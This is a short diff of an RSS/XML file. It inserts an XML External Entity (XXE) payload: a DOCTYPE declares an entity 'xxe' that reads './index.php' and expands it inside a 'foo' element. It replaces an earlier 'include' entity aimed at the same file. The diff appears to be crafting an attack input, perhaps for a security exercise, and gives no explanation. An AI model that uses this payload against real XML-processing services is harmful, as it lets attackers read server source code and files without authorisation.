@@ -1,8 +1,8 @@
-<?xml version="1.0" encoding="UTF-8" ?>
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "./index.php" >]><foo>&xxe;</foo>
 <rss version="2.0">
-<!DOCTYPE request [
-  <!ENTITY include SYSTEM "./index.php">
-]>
 <channel>
  <title>RSS Title</title>
  <description>This is an example of an RSS feed</description>
